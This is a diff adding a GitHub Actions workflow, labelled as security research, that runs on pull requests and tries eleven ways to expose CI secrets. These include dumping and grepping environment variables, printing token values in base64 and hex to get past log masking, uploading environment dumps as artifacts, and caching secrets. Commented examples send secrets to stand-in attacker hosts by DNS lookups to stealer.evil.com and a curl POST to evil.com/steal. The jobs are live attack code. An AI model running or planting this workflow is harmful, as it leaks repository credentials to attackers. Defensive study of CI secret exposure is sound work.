@@ -1,0 +1,316 @@
+name: Security Research - Secrets Exfiltration Test
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+# WARNING: This workflow is for RESEARCH PURPOSES ONLY
+# Demonstrates how PR workflows can exfiltrate secrets
+# Only use on repositories you own with fake/dummy secrets
+
+jobs:
+  # Attack Vector 1: Direct Secret Printing
+  test-secret-printing:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print all GitHub Actions secrets
+        run: |
+          echo "=== SECURITY RESEARCH: SECRET EXFILTRATION TEST ==="
+          echo "Attempting to print secrets..."
+
+          # Try common secret names
+          echo "Testing common secret patterns:"
+          env | grep -i secret | sort || echo "No secrets found with 'secret' in name"
+          env | grep -i token | sort || echo "No tokens found"
+          env | grep -i api | sort || echo "No API keys found"
+          env | grep -i key | sort || echo "No keys found"
+
+          # Print all environment variables (masked secrets will show ***)
+          echo "=== ALL ENVIRONMENT VARIABLES ==="
+          env | sort
+
+  # Attack Vector 2: Environment Dump to Artifact
+  test-environment-artifact:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump environment to file
+        run: |
+          echo "=== SECURITY RESEARCH: ENVIRONMENT DUMP ==="
+          env | sort > /tmp/environment_dump.txt
+          echo "Environment dumped to /tmp/environment_dump.txt"
+          echo "Total variables: $(wc -l < /tmp/environment_dump.txt)"
+
+      - name: Upload environment as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: security-research-environment-dump
+          path: /tmp/environment_dump.txt
+          retention-days: 1
+
+  # Attack Vector 3: GitHub Context Extraction
+  test-context-extraction:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Extract GitHub context
+        run: |
+          echo "=== SECURITY RESEARCH: GITHUB CONTEXT ==="
+          echo "Repository: $GITHUB_REPOSITORY"
+          echo "Ref: $GITHUB_REF"
+          echo "Actor: $GITHUB_ACTOR"
+          echo "Workflow: $GITHUB_WORKFLOW"
+          echo "Run ID: $GITHUB_RUN_ID"
+          echo "Run Number: $GITHUB_RUN_NUMBER"
+
+      - name: Dump full GitHub context
+        run: |
+          echo '${{ toJson(github) }}'
+
+  # Attack Vector 4: Secret Enumeration
+  test-secret-enumeration:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Find secret references in workflows
+        run: |
+          echo "=== SECURITY RESEARCH: SECRET ENUMERATION ==="
+          echo "Searching for secret references in workflow files..."
+
+          if [ -d ".github/workflows" ]; then
+            echo "=== SECRETS FOUND IN WORKFLOWS ==="
+            grep -h "secrets\." .github/workflows/*.yml 2>/dev/null | \
+              sed 's/.*secrets\./secrets./' | \
+              sed 's/[}\)].*//' | \
+              sed 's/}}//' | \
+              sort -u
+          else
+            echo "No .github/workflows directory found"
+          fi
+
+      - name: Try common secret names
+        run: |
+          echo "=== TESTING COMMON SECRET NAMES ==="
+          COMMON_SECRETS=(
+            "GITHUB_TOKEN"
+            "DEPLOY_KEY"
+            "API_KEY"
+            "API_TOKEN"
+            "SECRET_KEY"
+            "NPM_TOKEN"
+            "PYPI_TOKEN"
+            "AWS_ACCESS_KEY_ID"
+            "AWS_SECRET_ACCESS_KEY"
+            "DATABASE_URL"
+          )
+
+          for secret_name in "${COMMON_SECRETS[@]}"; do
+            if [ -n "${!secret_name}" ]; then
+              echo "✓ Found: $secret_name"
+              echo "  Value: ${!secret_name}"
+            fi
+          done
+
+  # Attack Vector 5: Workflow Discovery
+  test-workflow-discovery:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: List all workflow files
+        run: |
+          echo "=== SECURITY RESEARCH: WORKFLOW DISCOVERY ==="
+          echo "All workflow files in repository:"
+          find .github/workflows -name "*.yml" -o -name "*.yaml" 2>/dev/null || echo "No workflows found"
+
+      - name: Analyze workflow triggers
+        run: |
+          echo "=== WORKFLOW TRIGGER ANALYSIS ==="
+          echo "Workflows that run on pull_request:"
+
+          if [ -d ".github/workflows" ]; then
+            grep -l "pull_request" .github/workflows/*.yml 2>/dev/null | while read -r file; do
+              echo "  - $file"
+            done
+
+            echo "Workflows that inherit secrets:"
+            grep -l "secrets.*inherit" .github/workflows/*.yml 2>/dev/null | while read -r file; do
+              echo "  - $file (INHERITS SECRETS!)"
+            done
+          fi
+
+  # Attack Vector 6: Base64 Encoding to Bypass Masking
+  test-base64-bypass:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test Base64 encoding bypass
+        run: |
+          echo "=== SECURITY RESEARCH: BASE64 BYPASS ATTEMPT ==="
+
+          # Try to encode and print secrets (may bypass masking)
+          if [ -n "$GITHUB_TOKEN" ]; then
+            echo "GitHub Token (raw): $GITHUB_TOKEN"
+            echo "GitHub Token (base64): $(echo -n "$GITHUB_TOKEN" | base64)"
+            echo "GitHub Token (base64 first 20 chars): $(echo -n "$GITHUB_TOKEN" | base64 | cut -c1-20)"
+          fi
+
+          # Try hex encoding
+          if [ -n "$GITHUB_TOKEN" ]; then
+            echo "GitHub Token (hex): $(echo -n "$GITHUB_TOKEN" | xxd -p)"
+          fi
+
+  # Attack Vector 7: GitHub Token Information
+  test-github-token-info:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      issues: read
+      pull-requests: read
+    steps:
+      - name: Test GitHub Token permissions
+        run: |
+          echo "=== SECURITY RESEARCH: GITHUB_TOKEN ANALYSIS ==="
+          echo "Token exists: $(if [ -n "$GITHUB_TOKEN" ]; then echo "YES"; else echo "NO"; fi)"
+
+          # Test token usage
+          echo "Testing GitHub API access:"
+          curl -s -H "Authorization: token $GITHUB_TOKEN" \
+            https://api.github.com/user | jq -r '.login, .type, .site_admin' || echo "API call failed"
+
+          echo "Testing repository access:"
+          curl -s -H "Authorization: token $GITHUB_TOKEN" \
+            https://api.github.com/repos/$GITHUB_REPOSITORY | jq -r '.name, .private, .permissions'
+
+  # Attack Vector 8: DNS Exfiltration Test (Simulation)
+  test-dns-exfiltration:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Simulate DNS exfiltration
+        run: |
+          echo "=== SECURITY RESEARCH: DNS EXFILTRATION SIMULATION ==="
+          echo "This would normally send data via DNS queries"
+          echo "Example: nslookup 'secret-value.evil.com'"
+
+          # Simulate with local DNS query
+          TEST_SECRET="test123"
+          CHUNK="${TEST_SECRET:0:10}"
+          echo "Would query: $CHUNK.example.com"
+
+          # Note: In real attack, this would be:
+          # nslookup "${SECRET:0:10}.stealer.evil.com"
+          # nslookup "${SECRET:10:10}.stealer.evil.com"
+          # etc.
+
+  # Attack Vector 9: HTTP Exfiltration Test (Simulation)
+  test-http-exfiltration:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Simulate HTTP exfiltration
+        run: |
+          echo "=== SECURITY RESEARCH: HTTP EXFILTRATION SIMULATION ==="
+          echo "This would normally POST data to attacker-controlled server"
+
+          # Simulate with httpbin (for testing only)
+          echo "Repository: $GITHUB_REPOSITORY"
+          echo "Actor: $GITHUB_ACTOR"
+          echo "Token: ${GITHUB_TOKEN:0:10}... (truncated)"
+
+          # Note: In real attack, this would be:
+          # curl -X POST https://evil.com/steal \
+          #   -d "repo=$GITHUB_REPOSITORY" \
+          #   -d "token=$GITHUB_TOKEN" \
+          #   -d "all_env=$(env | base64 -w 0)"
+
+  # Attack Vector 10: Cache Poisoning Test
+  test-cache-poisoning:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create malicious cache
+        run: |
+          echo "=== SECURITY RESEARCH: CACHE POISONING SIMULATION ==="
+          mkdir -p cache_dir
+          echo "Stolen secrets would go here" > cache_dir/secrets.txt
+          env | grep -i secret > cache_dir/env_secrets.txt || true
+
+      - name: Save to cache
+        uses: actions/cache@v4
+        with:
+          path: cache_dir
+          key: security-research-cache-${{ github.sha }}
+
+      - name: Restore from cache
+        uses: actions/cache@v4
+        with:
+          path: cache_dir
+          key: security-research-cache-${{ github.sha }}
+
+      - name: Display cached data
+        run: |
+          echo "Cache contents:"
+          cat cache_dir/secrets.txt || true
+          cat cache_dir/env_secrets.txt || true
+
+  # Attack Vector 11: Reusable Workflow Test
+  test-reusable-workflow:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test reusable workflow concept
+        run: |
+          echo "=== SECURITY RESEARCH: REUSABLE WORKFLOW CONCEPT ==="
+          echo "If this workflow used 'secrets: inherit', all repository"
+          echo "secrets would be available to the reusable workflow"
+          echo ""
+          echo "Current available secrets (from environment):"
+          env | grep -i secret || echo "None found with 'secret' in name"
+
+  # Summary Report
+  generate-report:
+    runs-on: ubuntu-latest
+    needs: [
+      test-secret-printing,
+      test-environment-artifact,
+      test-context-extraction,
+      test-secret-enumeration,
+      test-workflow-discovery,
+      test-base64-bypass,
+      test-github-token-info,
+      test-dns-exfiltration,
+      test-http-exfiltration,
+      test-cache-poisoning,
+      test-reusable-workflow
+    ]
+    if: always()
+    steps:
+      - name: Generate summary report
+        run: |
+          echo "=== SECURITY RESEARCH SUMMARY ==="
+          echo ""
+          echo "Repository: $GITHUB_REPOSITORY"
+          echo "Triggered by: $GITHUB_ACTOR"
+          echo "PR Number: ${{ github.event.pull_request.number }}"
+          echo ""
+          echo "Attack Vectors Tested:"
+          echo "  1. Direct Secret Printing - Check job logs"
+          echo "  2. Environment Artifact - Check artifacts section"
+          echo "  3. GitHub Context - Check job logs"
+          echo "  4. Secret Enumeration - Check job logs"
+          echo "  5. Workflow Discovery - Check job logs"
+          echo "  6. Base64 Bypass - Check job logs"
+          echo "  7. GitHub Token Info - Check job logs"
+          echo "  8. DNS Exfiltration - Check job logs (simulated)"
+          echo "  9. HTTP Exfiltration - Check job logs (simulated)"
+          echo " 10. Cache Poisoning - Check job logs"
+          echo " 11. Reusable Workflow - Check job logs"
+          echo ""
+          echo "RECOMMENDATIONS:"
+          echo "  ✓ Review all workflow logs for exposed secrets"
+          echo "  ✓ Check artifacts for sensitive data"
+          echo "  ✓ Restrict workflow permissions"
+          echo "  ✓ Avoid 'secrets: inherit' on PR workflows"
+          echo "  ✓ Implement branch protection rules"
+          echo "  ✓ Enable GitHub Advanced Security scanning"
+          echo ""
+          echo "⚠️  REMEMBER: This was a SECURITY RESEARCH test"
+          echo "   In a real attack, these would be sent to attacker-controlled endpoints"
